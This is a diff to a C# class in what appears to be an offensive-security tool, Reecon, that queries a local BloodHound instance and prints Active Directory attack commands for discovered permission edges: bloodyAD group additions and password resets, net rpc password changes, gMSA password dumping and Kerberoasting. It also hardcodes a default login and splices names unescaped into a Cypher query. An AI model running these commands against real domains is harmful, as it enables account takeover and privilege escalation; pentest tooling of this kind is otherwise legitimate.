@@ -11,11 +11,11 @@ using System.Threading;
 
 namespace Reecon
 {
-    public class Bloodhound
+    public static class Bloodhound
     {
-        private static string BloodhoundUsername = "admin";
-        private static string BloodhoundPassword = "Password111!";
-        private static string BloodhoundURL = "http://localhost:8080/"; // With trailing /
+        private static readonly string BloodhoundUsername = "admin";
+        private static readonly string BloodhoundPassword = "Password111!";
+        private static readonly string BloodhoundURL = "http://localhost:8080/"; // With trailing /
 
         public static void Run(string[] args)
         {
@@ -28,7 +28,16 @@ namespace Reecon
                 else
                 {
                     string username = args[1];
-                    GetInfo(username);
+                    if (username.StartsWith('-'))
+                    {
+                        Console.WriteLine("You probably typo'd something.");
+                        Console.WriteLine($"Usage: {General.ProgramName} -bloodhound -ingest");
+                        Console.WriteLine($"Usage: {General.ProgramName} -bloodhound username@domain.com");
+                    }
+                    else
+                    {
+                        GetInfo(username);
+                    }
                 }
             }
             else
@@ -38,7 +47,7 @@ namespace Reecon
             }
         }
 
-        public static void Ingest()
+        private static void Ingest()
         {
             string? jwt = Auth();
             if (jwt == null)
@@ -57,11 +66,11 @@ namespace Reecon
             Console.WriteLine("Ingestion Complete!");
         }
 
-        public record Node(int Key, string Name, string ObjectId, string Type);
+        private record Node(int Key, string Name, string ObjectId, string Type);
 
-        public record Relationship(string Type, int FromKey, int ToKey);
+        private record Relationship(string Type, int FromKey, int ToKey);
 
-        public static void GetInfo(string userId)
+        private static void GetInfo(string userId)
         {
             string? jwt = Auth();
             if (jwt == null)
@@ -72,7 +81,7 @@ namespace Reecon
 
             Console.WriteLine("Exploring data...");
             // Get Profile ObjectId
-            (string Text, HttpStatusCode StatusCode) profileIdReq = Web.DownloadString($"http://localhost:8080/api/v2/search?q={userId}", JWT: jwt);
+            (string Text, HttpStatusCode StatusCode) profileIdReq = Web.DownloadString($"{BloodhoundURL}api/v2/search?q={userId}", JWT: jwt);
             if (profileIdReq.StatusCode != HttpStatusCode.OK)
             {
                 Console.WriteLine("Error - Unable to get info :(");
@@ -89,22 +98,62 @@ namespace Reecon
             string profileId = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data")[0].GetProperty("objectid").ToString();
             Console.WriteLine("PID: " + profileId);
 
+            // Type
+            string nodeType = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data")[0].GetProperty("type").ToString();
+            if (nodeType == "User")
+            {
+                Console.WriteLine("Type: User");
+                string nodeName = JsonDocument.Parse(profileIdReq.Text).RootElement.GetProperty("data")[0].GetProperty("name").ToString();
+                string userName = nodeName.Split('@')[0];
+                string userDomain = nodeName.Split('@')[1];
+                // Siblings in the same OU
+                string req = $"MATCH (u:User {{name: '{nodeName}'}})<-[:Contains]-(ou:OU)-[:Contains]->(sibling:User) " + // Is ObjectId faster... ? 
+                             "WHERE u <> sibling " +
+                             "RETURN sibling";
+
+                Dictionary<string, string> authHeader = new() { { "Authorization", "Bearer " + jwt } };
+                string postData = $$"""{"query":"{{req}}","include_properties":true}""";
+                Dictionary<string, string> headers = new() { { "Content-Type", "application/json" } };
+                byte[] byteData = Encoding.ASCII.GetBytes(postData);
+                Web.UploadDataResult cypherReq = Web.UploadData($"{BloodhoundURL}api/v2/graphs/cypher", RequestHeaders: authHeader, ContentHeaders: headers, PostContent: byteData);
+
+                // (string Text, HttpStatusCode StatusCode) cypherReq = Web.DownloadString($"{BloodhoundURL}ui/explore?exploreSearchTab=cypher&searchType=cypher&cypherSearch={base64Req}", JWT: jwt);
+                if (cypherReq.StatusCode == HttpStatusCode.OK)
+                {
+                    JsonDocument cypherResult = JsonDocument.Parse(cypherReq.Text);
+                    int nodeCount = cypherResult.RootElement.GetProperty("data").GetProperty("nodes").GetPropertyCount();
+                    if (nodeCount != 0)
+                    {
+                        Console.WriteLine($"- Found {nodeCount} siblings in the same OU");
+
+                        foreach (JsonProperty memberNode in cypherResult.RootElement.GetProperty("data").GetProperty("nodes").EnumerateObject())
+                        {
+                            JsonElement userObject = memberNode.Value;
+                            string? labelName = userObject.GetProperty("label").GetString();
+                            Console.WriteLine("-- " + labelName);
+                            // Console.WriteLine(memberNode.GetProperty("properties").GetProperty("displayname").GetString());
+                        }
+
+                        Console.WriteLine($"-- GetUserSPNs.py -dc-ip {"IP".Recolor(Color.Green)} '{userDomain}/{userName}:{"PASSWORD".Recolor(Color.Green)}' -request -k -dc-host {"dc".Recolor(Color.Green)}.{userDomain}");
+                    }
+                }
+            }
+
             // Memberships
-            (string Text, HttpStatusCode StatusCode) membershipsReq = Web.DownloadString($"http://localhost:8080/api/v2/users/{profileId}/memberships", JWT: jwt);
-            var membershipsInfo = JsonDocument.Parse(membershipsReq.Text);
+            (string Text, HttpStatusCode StatusCode) membershipsReq = Web.DownloadString($"{BloodhoundURL}api/v2/users/{profileId}/memberships", JWT: jwt);
+            JsonDocument membershipsInfo = JsonDocument.Parse(membershipsReq.Text);
             JsonElement membershipsChildren = membershipsInfo.RootElement.GetProperty("data");
             foreach (JsonElement membership in membershipsChildren.EnumerateArray())
             {
                 string membershipName = membership.GetProperty("name").GetString() ?? "INVALID - BUG REELIX";
                 if (membershipName.StartsWith("REMOTE MANAGEMENT USERS")) // Any other super important ones?
                 {
-                    Console.WriteLine("Member Of: " +membershipName.Recolor(Color.Green) + " <---- WINRM!!!");
+                    Console.WriteLine("Member Of: " + membershipName.Recolor(Color.Green) + " <---- WINRM!!!");
                 }
                 else
                 {
                     Console.WriteLine("Member Of: " + membershipName);
                 }
-                
             }
 
             // Ownables 
@@ -146,8 +195,8 @@ namespace Reecon
                 return;
             }
 
-            var nodeMap = nodeList.ToDictionary(node => node.Key);
-            var startNode = nodeMap.Values.FirstOrDefault(node => node.ObjectId == profileId);
+            Dictionary<int, Node> nodeMap = nodeList.ToDictionary(node => node.Key);
+            Node? startNode = nodeMap.Values.FirstOrDefault(node => node.ObjectId == profileId);
             if (startNode == null)
             {
                 Console.WriteLine($"Error: Could not find the starting node for PID: {profileId}");
@@ -172,12 +221,12 @@ namespace Reecon
                 var currentNode = nodesToProcess.Dequeue();
 
                 // Find all relationships originating from the current node
-                var outgoingRelationships = relationshipList.Where(rel => rel.FromKey == currentNode.Key);
+                IEnumerable<Relationship> outgoingRelationships = relationshipList.Where(rel => rel.FromKey == currentNode.Key);
 
-                foreach (var rel in outgoingRelationships)
+                foreach (Relationship rel in outgoingRelationships)
                 {
                     // Find the target node of the relationship
-                    if (nodeMap.TryGetValue(rel.ToKey, out var targetNode))
+                    if (nodeMap.TryGetValue(rel.ToKey, out Node? targetNode))
                     {
                         // Print the relationship we found
                         Console.WriteLine($"{currentNode.Name} ({currentNode.Type}) -> {rel.Type} -> {targetNode.Name} ({targetNode.Type})");
@@ -203,28 +252,22 @@ namespace Reecon
         {
             // https://bloodhound.specterops.io/resources/edges/overview
 
-            // The Computer has AddSelf to a Group
-            if (node1Type == "Computer" && relationshipType == "AddSelf" && node2Type == "Group")
+            string IP;
+            string mainDomain = node1Name.Split('@')[1];
+            try
             {
-                string domain = node2Name.Split('@')[1];
-                string computerName = node1Name.Replace('.' + domain, "") + "$"; // Computer names with commands end with a $
-                string groupName = node2Name.Split('@')[0];
-                Console.WriteLine($"- The Computer {computerName} can add itself to the Group {groupName}");
-                Console.WriteLine(
-                    $"-- bloodyAD -k --host {"dc".Recolor(Color.Green)}.{domain} -d {domain} -u '{computerName}' -p '{"COMPUTER-PASSWORD".Recolor(Color.Green)}' add groupMember {groupName} '{computerName}'");
+                IP = Dns.GetHostEntry(mainDomain).AddressList.First().ToString();
             }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"- Unable to continue - {mainDomain} is not in your hosts file");
+                General.HandleUnknownException(ex);
+                return;
+            }
+            //
+            // Users
+            //
 
-            // The Group has ForceChangePassword to a User
-            if (node1Type == "Group" && relationshipType == "ForceChangePassword" && node2Type == "User")
-            {
-                string groupName = node1Name.Split('@')[0];
-                string domain = node1Name.Split('@')[1];
-                string userName = node2Name.Split('@')[0];
-                Console.WriteLine($"- Members of {groupName} can change the password of {userName}");
-                Console.WriteLine(
-                    $"-- bloodyAD -k --host {"dc".Recolor(Color.Green)}.{domain} -d {domain} -u '{"OWNED-USER".Recolor(Color.Green)}' -p '{"OWNED-USER_PASSWORD".Recolor(Color.Green)}' set password {userName} 'Password123!'");
-            }
-            
             // The User has WriteSPN to another User
             if (node1Type == "User" && relationshipType == "WriteSPN" && node2Type == "User")
             {
@@ -237,26 +280,82 @@ namespace Reecon
                 Console.WriteLine("-- KRB_AP_ERR_SKEW(Clock skew too great) -> faketime");
             }
 
-            /*
-            // The Computer can ForceChangePassword of a User
-            if (sortedNodes.Count == 2 && sortedRelationships.Count == 1)
+            // The User has AddSelf to a group
+            if (node1Type == "User" && relationshipType == "AddSelf" && node2Type == "Group")
             {
-                if (sortedNodes[0].Data?.NodeType == "Computer" &&
-                    sortedNodes[1].Data?.NodeType == "User" &&
-                    sortedRelationships[0].LabelInfo?.Text == "ForceChangePassword")
+                Console.WriteLine("- Interesting Thing Found!");
+                string userName = node1Name.Split('@')[0];
+                string userDomain = node1Name.Split('@')[1];
+                string groupName = node2Name.Split('@')[0];
+                Console.WriteLine($"- {userDomain} can add themself to {groupName} due to AddSelf permissions.");
+                Console.WriteLine($"-- bloodyAD --host {IP} -d {userDomain} -u {userName} -p '{"PASSWORD".Recolor(Color.Green)}' add groupMember {groupName} {userName}");
+            }
+
+            // The User has WriteOwner over another User
+            if (node1Type == "User" && relationshipType == "WriteOwner" && node2Type == "User")
+            {
+                string firstUserName = node1Name.Split('@')[0];
+                string secondUserName = node2Name.Split('@')[0];
+                string domain = node1Name.Split('@')[1];
+                Console.WriteLine($"- {firstUserName} has write ownership over {secondUserName}");
+                Console.WriteLine($"-- bloodyAD --host {IP} -d {domain} -u {firstUserName} -p '{"PASSWORD".Recolor(Color.Green)}' add genericAll {secondUserName} {firstUserName}");
+                Console.WriteLine($"-- bloodyAD --host {IP} -d {domain} -u {firstUserName} -p '{"PASSWORD".Recolor(Color.Green)}' set password {secondUserName} 'Password123!'");
+            }
+
+            //
+            // Groups
+            //
+
+            // The Group has ForceChangePassword to a User
+            if (node1Type == "Group" && relationshipType == "ForceChangePassword" && node2Type == "User")
+            {
+                string groupName = node1Name.Split('@')[0];
+                string domain = node1Name.Split('@')[1];
+                string userName = node2Name.Split('@')[0];
+                Console.WriteLine($"- Members of {groupName} can change the password of {userName}");
+                Console.WriteLine(
+                    $"-- bloodyAD -k --host {"dc".Recolor(Color.Green)}.{domain} -d {domain} -u '{"OWNED-USER".Recolor(Color.Green)}' -p '{"OWNED-USER_PASSWORD".Recolor(Color.Green)}' set password {userName} 'Password123!'");
+            }
+
+            // The Group can read the password of a Computer
+            if (node1Type == "Group" && relationshipType == "ReadGMSAPassword" && node2Type == "Computer")
+            {
                 {
-                    NodeItem computerNode = sortedNodes[0];
-                    NodeItem userNode = sortedNodes[1];
-                    string? computerName = computerNode.Data?.Name?.Split('@')[0];
-                    string? userName = userNode.Data?.Name?.Split('@')[0];
-                    string? domain = userNode.Data?.Name?.Split('@')[1];
-                    Console.WriteLine("- Interesting Thing Found!");
-                    Console.WriteLine($"- {computerName} can change the password of {userName} without knowing it!");
-                    Console.WriteLine(
-                        $"-- net rpc password '{userName}' 'Password123!' -U '{domain}'/'{computerName}'%'{"PASSWORD_OR_HASH".Recolor(Color.Green)}' -S '{domain}' --pw-nt-hash (If applicable)");
+                    // NodeItem computerNode = sortedNodes[1];
+                    string groupName = node1Name.Split('@')[0];
+                    string domain = node1Name.Split('@')[1];
+                    string computerName = node2Name.Split('@')[0];
+                    Console.WriteLine($"- Users of Group {groupName} can read the GMSA Passsword of the Computer {computerName}");
+                    Console.WriteLine($"-- python3 gMSADumper.py -u '{"UserInGroup".Recolor(Color.Green)}' -p '{"UserPass".Recolor(Color.Green)}' -d '{domain}'");
                 }
             }
 
+            //
+            // Computers
+            //
+
+            // The Computer has AddSelf to a Group
+            if (node1Type == "Computer" && relationshipType == "AddSelf" && node2Type == "Group")
+            {
+                string domain = node2Name.Split('@')[1];
+                string computerName = node1Name.Replace('.' + domain, "") + "$"; // Computer names with commands end with a $
+                string groupName = node2Name.Split('@')[0];
+                Console.WriteLine($"- The Computer {computerName} can add itself to the Group {groupName}");
+                Console.WriteLine(
+                    $"-- bloodyAD -k --host {"dc".Recolor(Color.Green)}.{domain} -d {domain} -u '{computerName}' -p '{"COMPUTER-PASSWORD".Recolor(Color.Green)}' add groupMember {groupName} '{computerName}'");
+            }
+
+            // The Computer can ForceChangePassword of a User
+            if (node1Type == "Computer" && relationshipType == "ForceChangePassword" && node2Type == "User")
+            {
+                string computerName = node1Name.Split('@')[0];
+                string userName = node2Name.Split('@')[0];
+                string domain = node2Name.Split('@')[1];
+                Console.WriteLine($"- {computerName} can change the password of {userName} without knowing it!");
+                Console.WriteLine($"-- net rpc password '{userName}' 'Password123!' -U '{domain}'/'{computerName}'%'{"PASSWORD_OR_HASH".Recolor(Color.Green)}' -S '{domain}' --pw-nt-hash (If applicable)");
+            }
+
+            /*
             // The Group can read the password of a Computer
             if (sortedNodes.Count == 2 && sortedRelationships.Count == 1)
             {
@@ -508,7 +607,7 @@ namespace Reecon
             DateTime afterData = DateTime.Now;
             TimeSpan ingestTime = afterData - beforeData;
             Console.WriteLine();
-            Console.WriteLine($"Upload ingested in {ingestTime.TotalSeconds} seconds.");
+            Console.WriteLine($"Upload ingested in {(int)ingestTime.TotalSeconds} seconds.");
             return true;
         }
 
